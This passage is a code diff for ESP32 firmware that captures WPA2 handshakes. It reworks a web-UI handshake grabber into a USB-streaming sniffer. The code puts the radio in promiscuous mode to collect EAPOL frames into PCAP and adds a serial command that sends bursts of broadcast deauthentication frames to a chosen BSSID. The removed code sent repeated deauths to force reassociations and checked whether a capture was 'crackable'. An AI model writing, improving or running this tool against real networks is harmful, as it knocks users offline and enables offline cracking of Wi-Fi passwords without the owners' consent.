-    if (xSemaphoreTake(g_hsMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
-      hs = g_hs; xSemaphoreGive(g_hsMutex);
-    }
-    size_t bytes = 0, cap = 0; bool ov = false;
-    if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(20)) == pdTRUE) {
-      bytes = g_capLen; cap = g_capCapacity; ov = g_capOverflow;
-      xSemaphoreGive(g_capMutex);
-    }
-    char buf[240];
-    snprintf(buf, sizeof(buf),
-      "{\"on\":%s,\"m1\":%s,\"m2\":%s,\"m3\":%s,\"m4\":%s,"
-      "\"ok\":%s,\"bytes\":%u,\"cap\":%u,\"overflow\":%s,"
-      "\"eapol\":%u,\"frames\":%u}",
-      g_capturing.load() ? "true" : "false",
-      hs.m1 ? "true" : "false", hs.m2 ? "true" : "false",
-      hs.m3 ? "true" : "false", hs.m4 ? "true" : "false",
-      (hs.m1 && hs.m2) ? "true" : "false",
-      (unsigned)bytes, (unsigned)cap, ov ? "true" : "false",
-      (unsigned)g_eapolSeen.load(), (unsigned)hs.frame_count);
-    r->send(200, "application/json", buf);
-  });
-
-  server.on("/pcap", HTTP_GET, [](AsyncWebServerRequest* r){
-    if (!g_capBuf) { r->send(404, "text/plain", "no buffer"); return; }
-    size_t len = 0;
-    if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
-      len = g_capLen; xSemaphoreGive(g_capMutex);
-    }
-    if (len <= sizeof(PcapGlobalHdr)) {
-      r->send(404, "text/plain", "no data"); return;
-    }
-    uint8_t* snap = (uint8_t*)heap_caps_malloc(len, MALLOC_CAP_SPIRAM);
-    if (!snap) snap = (uint8_t*)malloc(len);
-    if (!snap) { r->send(500, "text/plain", "OOM"); return; }
-
-    if (xSemaphoreTake(g_capMutex, pdMS_TO_TICKS(200)) == pdTRUE) {
-      memcpy(snap, g_capBuf, len);
-      xSemaphoreGive(g_capMutex);
+  if (cmd[0] == 'c' || cmd[0] == 'C') {
+    // Change channel: "c 13"
+    int ch = atoi(cmd + 1);
+    if (ch >= 1 && ch <= 13) {
+      setChannel(ch);
+#if SERIAL_CMD_ECHO
+      char line[48];
+      snprintf(line, sizeof(line), "[CHANNEL] now %d\r\n", ch);
+      Serial.print(line);
+#endif
     } else {
-      free(snap); r->send(503, "text/plain", "busy"); return;
+#if SERIAL_CMD_ECHO
+      Serial.print("[ERROR] channel must be 1-13\r\n");
+#endif
     }
+    return;
+  }
 
-    // ESPAsyncWebServer 3.x: beginResponse(contentType, len, filler)
-    auto* resp = r->beginResponse("application/octet-stream", len,
-      [snap, len](uint8_t* buf, size_t maxLen, size_t idx) -> size_t {
-        size_t rem = len - idx;
-        size_t n = rem < maxLen ? rem : maxLen;
-        if (n == 0) { free(snap); return 0; }
-        memcpy(buf, snap + idx, n);
-        return n;
-      });
-    resp->addHeader("Content-Disposition", "attachment; filename=\"handshake.pcap\"");
-    r->send(resp);
-  });
+  if (cmd[0] == 'd' || cmd[0] == 'D') {
+    // Deauth: "d AA:BB:CC:DD:EE:FF"
+    const char* p = cmd + 1;
+    while (*p == ' ') p++;
+    uint8_t bssid[6];
+    if (sscanf(p, "%02hhx:%02hhx:%02hhx:%02hhx:%02hhx:%02hhx",
+               &bssid[0], &bssid[1], &bssid[2],
+               &bssid[3], &bssid[4], &bssid[5]) == 6) {
+      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
+      sendDeauth(bssid, bcast);
+#if SERIAL_CMD_ECHO
+      char line[64];
+      snprintf(line, sizeof(line),
+        "[DEAUTH] %02X:%02X:%02X:%02X:%02X:%02X x%d\r\n",
+        bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
+        DEAUTH_BURST);
+      Serial.print(line);
+#endif
+    } else {
+#if SERIAL_CMD_ECHO
+      Serial.print("[ERROR] usage: d AA:BB:CC:DD:EE:FF\r\n");
+#endif
+    }
+    return;
+  }
 
-  // Captive portal probes
-  server.on("/generate_204", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(204); });
-  server.on("/gen_204", HTTP_GET, [](AsyncWebServerRequest* r){ r->send(204); });
-  server.on("/hotspot-detect.html", HTTP_GET, [](AsyncWebServerRequest* r){
-    r->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
-  });
-  server.on("/library/test/success.html", HTTP_GET, [](AsyncWebServerRequest* r){
-    r->send(200, "text/html", "<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>");
-  });
-  server.on("/ncsi.txt", HTTP_GET, [](AsyncWebServerRequest* r){
-    r->send(200, "text/plain", "Microsoft NCSI");
-  });
-  server.on("/connecttest.txt", HTTP_GET, [](AsyncWebServerRequest* r){
-    r->send(200, "text/plain", "Microsoft Connect Test");
-  });
-  server.on("/success.txt", HTTP_GET, [](AsyncWebServerRequest* r){
-    r->send(200, "text/plain", "success");
-  });
-  server.onNotFound([](AsyncWebServerRequest* r){
-    r->redirect("http://192.168.4.1/");
-  });
+#if SERIAL_CMD_ECHO
+  Serial.print("[CMD] s=status r=reset c<ch>=channel d<bssid>=deauth\r\n");
+#endif
 }
 
-// ── Setup ───────────────────────────────────────────────────────────────────
+// ── Setup ─────────────────────────────────────────────────────────────────────
 void setup() {
-  Serial.begin(115200);
-  delay(150);
-  Serial.println("\n=== Handshake Capture (hardened) ===");
+  // ── USB CDC init ────────────────────────────────────────────────────────────
+  // setTxBufferSize must be called before Serial.begin() on HWCDC.
+  // 8 KB TX buffer prevents write stalls when bursts exceed USB packet cadence.
+  Serial.setTxBufferSize(CDC_TX_BUF);
+  Serial.begin(0);   // baud rate is irrelevant for USB CDC; 0 = don't touch divisor
+  delay(200);        // allow USB enumeration on the Android side to complete
 
-  g_capMutex = xSemaphoreCreateMutex();
-  g_hsMutex  = xSemaphoreCreateMutex();
-  if (!g_capMutex || !g_hsMutex) {
-    Serial.println("FATAL mutex");
-    while (1) delay(1000);
-  }
-
-  // Prefer PSRAM for capture buffer
-  if (psramFound()) {
-    g_capBuf = (uint8_t*)heap_caps_malloc(CAP_BUF_SIZE, MALLOC_CAP_SPIRAM);
-    if (g_capBuf) {
-      g_capCapacity = CAP_BUF_SIZE;
-      Serial.printf("PSRAM buffer %u KB\n", (unsigned)(CAP_BUF_SIZE / 1024));
-    }
-  }
-  if (!g_capBuf) {
-    g_capCapacity = CAP_BUF_SIZE / 4;
-    g_capBuf = (uint8_t*)malloc(g_capCapacity);
-    Serial.printf("Heap buffer %u KB\n", (unsigned)(g_capCapacity / 1024));
-  }
-  if (!g_capBuf) {
-    Serial.println("FATAL no buffer");
-    while (1) delay(1000);
-  }
-  PcapGlobalHdr gh = {0xa1b2c3d4u, 2, 4, 0, 0, 65535, 105};
-  memcpy(g_capBuf, &gh, sizeof(gh));
-  g_capLen = sizeof(gh);
-
+  // ── NVS init ────────────────────────────────────────────────────────────────
   esp_err_t nvs = nvs_flash_init();
   if (nvs == ESP_ERR_NVS_NO_FREE_PAGES || nvs == ESP_ERR_NVS_NEW_VERSION_FOUND) {
     nvs_flash_erase();
     nvs_flash_init();
   }
 
-  // Start in AP+STA so deauth TX works while SoftAP stays up
-  WiFi.mode(WIFI_AP_STA);
-  delay(50);
-
-  IPAddress apIP(192, 168, 4, 1), gw(192, 168, 4, 1), sn(255, 255, 255, 0);
-  WiFi.softAPConfig(apIP, gw, sn);
-
-  wifi_country_t cc = {};
-  cc.cc[0] = 'P'; cc.cc[1] = 'H';
-  cc.schan = 1; cc.nchan = 13; cc.max_tx_power = 20;
-  cc.policy = WIFI_COUNTRY_POLICY_MANUAL;
-  esp_wifi_set_country(&cc);
-
-  if (!WiFi.softAP(AP_SSID, AP_PASS, AP_CHANNEL, 0, 4)) {
-    Serial.println("FATAL softAP failed");
+  // ── PSRAM ring buffer ────────────────────────────────────────────────────────
+  // RINGBUF_TYPE_NOSPLIT guarantees each xRingbufferSend()/Receive() pair
+  // is atomic — no record is split across the ring wrap boundary, which is
+  // critical since we send exactly one PCAP record (header+payload) per call.
+  g_ring = xRingbufferCreateWithCaps(RING_SIZE, RINGBUF_TYPE_NOSPLIT, MALLOC_CAP_SPIRAM);
+  if (!g_ring) {
+    // PSRAM unavailable — fall back to internal RAM with a smaller buffer.
+    g_ring = xRingbufferCreate(32 * 1024, RINGBUF_TYPE_NOSPLIT);
+  }
+  if (!g_ring) {
+    Serial.print("[FATAL] ring buffer alloc failed\r\n");
     while (1) delay(1000);
   }
-  delay(200);
+
+  // ── Wi-Fi init ───────────────────────────────────────────────────────────────
+  // STA-only: the radio has one physical channel register. Running SoftAP and
+  // promiscuous sniffing at the same time forces the driver to share the radio
+  // between the AP beacon channel and the sniffer channel, causing the freezes
+  // and missed EAPOL frames observed in the original design.
+  // In STA-only mode with no association, the channel register is under our
+  // exclusive control.
+  WiFi.mode(WIFI_STA);
+  delay(50);
+
+  // Country code: PH / manual policy / channels 1-13
+  // Without WIFI_COUNTRY_POLICY_MANUAL the SDK clamps to the country's
+  // regulatory channel list derived from received beacons, which may omit
+  // channel 13 in some regions.
+  wifi_country_t cc = {};
+  cc.cc[0]       = 'P';
+  cc.cc[1]       = 'H';
+  cc.cc[2]       = '\0';
+  cc.schan       = 1;
+  cc.nchan       = 13;
+  cc.max_tx_power = 20;
+  cc.policy      = WIFI_COUNTRY_POLICY_MANUAL;
+  esp_wifi_set_country(&cc);
+
   esp_wifi_set_max_tx_power(MAX_TX_POWER);
   esp_wifi_set_ps(WIFI_PS_NONE);
 
-  dns.start(DNS_PORT, "*", apIP);
-  setupServer();
-  server.begin();
+  // Fix the radio on TARGET_CHANNEL.
+  esp_wifi_set_channel((uint8_t)TARGET_CHANNEL, WIFI_SECOND_CHAN_NONE);
 
-  Serial.printf("AP: %s\nIP: %s\nUI: http://192.168.4.1/\n",
-                AP_SSID, WiFi.softAPIP().toString().c_str());
-  Serial.printf("Override: ieee80211_raw_frame_sanity_check → accept-all\n");
+  // ── Promiscuous filter: data frames only ─────────────────────────────────────
+  // WIFI_PROMIS_FILTER_MASK_DATA passes all data subtypes including QoS Data,
+  // which is where 802.1X / EAPOL frames travel in WPA2 4-way handshakes.
+  // Filtering here (hardware-side) prevents the ISR from being called for
+  // management and control frames we don't need, reducing CPU load.
+  wifi_promiscuous_filter_t filt = {};
+  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_DATA;
+  esp_wifi_set_promiscuous_filter(&filt);
+  esp_wifi_set_promiscuous_rx_cb(&promisc_cb);
+  esp_wifi_set_promiscuous(true);
+  g_capturing.store(true);
+
+  // ── Drain task: Core 1, priority 5 ───────────────────────────────────────────
+  // Pinned to Core 1. The Wi-Fi subsystem (including the promiscuous ISR) runs
+  // on Core 0. Separating the USB write path to Core 1 prevents the drain
+  // from adding latency to ISR scheduling on Core 0.
+  xTaskCreatePinnedToCore(
+    drainTask,    // task function
+    "pcap_drain", // name
+    4096,         // stack (bytes)
+    nullptr,      // arg
+    5,            // priority (higher than loop's 1)
+    nullptr,      // handle not needed
+    1             // Core 1
+  );
+
+  // ── Emit PCAP global header ───────────────────────────────────────────────────
+  // Written directly here (not through the ring buffer) because it must be the
+  // very first bytes on the wire, before any record can arrive from the ISR.
+  // The drain task is already running but the ring buffer is empty, so there
+  // is no race — Serial.write() from setup() and from drainTask() is serialised
+  // by the HWCDC internal TX mutex.
+  PcapGlobalHdr gh = {
+    0xa1b2c3d4u,  // magic: little-endian, microsecond timestamps
+    2, 4,         // version 2.4
+    0,            // timezone offset: UTC
+    0,            // timestamp accuracy: 0 (standard)
+    65535,        // snaplen
+    105           // DLT_IEEE802_11 — raw 802.11 frames, no radiotap
+  };
+  Serial.write((const uint8_t*)&gh, sizeof(gh));
+  Serial.flush();
+
+  // ── Boot banner on Serial (text, follows global header) ──────────────────────
+  // These text bytes appear after the 24-byte PCAP global header.
+  // Wireshark's libpcap reader has already consumed the header and is now
+  // seeking PCAP record magic in the first 4 bytes of each record (ts_sec field).
+  // Text lines cannot be mistaken for a valid 32-bit timestamp + 3 more fields
+  // in practice; Wireshark will show a "short packet" warning for any garbage
+  // record but will not crash. Set SERIAL_CMD_ECHO 0 to suppress all text for
+  // a surgically clean binary stream.
+  Serial.printf("\r\n[BOOT] ch=%d country=PH ring=%u KB override=active\r\n",
+                TARGET_CHANNEL, (unsigned)(RING_SIZE / 1024));
+  Serial.print("[CMD] s=status r=reset c<1-13>=channel d<bssid>=deauth\r\n");
 }
 
+// ── Loop ─────────────────────────────────────────────────────────────────────
+// The PCAP drain is handled by drainTask. loop() only needs to service the
+// Serial command interface and yield so the idle task can feed the watchdog.
 void loop() {
-  dns.processNextRequest();
-
-  if (g_capturing.load()) {
-    // Mid-capture deauth refresh every ~2 s to force more reassociations
-    static uint32_t lastDeauth = 0;
-    uint32_t now = millis();
-    if (now - lastDeauth > 2000) {
-      lastDeauth = now;
-      int ch = g_targetCh.load();
-      uint8_t bcast[6] = {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF};
-      sendDeauth(g_targetBSSID, bcast, ch);
-    }
-
-    if (isCrackable() || (now - g_captureStart.load() > CAPTURE_MS)) {
-      bool ok = isCrackable();
-      stopCapture();
-      Serial.println(ok ? "[HS] Ready (M1+M2)" : "[HS] Timeout");
+  // Non-blocking Serial command reader — accumulates chars until '\n'
+  while (Serial.available()) {
+    char c = (char)Serial.read();
+    if (c == '\n' || c == '\r') {
+      if (s_cmdLen > 0) {
+        s_cmdBuf[s_cmdLen] = '\0';
+        handleCommand(s_cmdBuf);
+        s_cmdLen = 0;
+      }
+    } else if (s_cmdLen < (uint8_t)(sizeof(s_cmdBuf) - 1)) {
+      s_cmdBuf[s_cmdLen++] = c;
     }
   }
   delay(5);
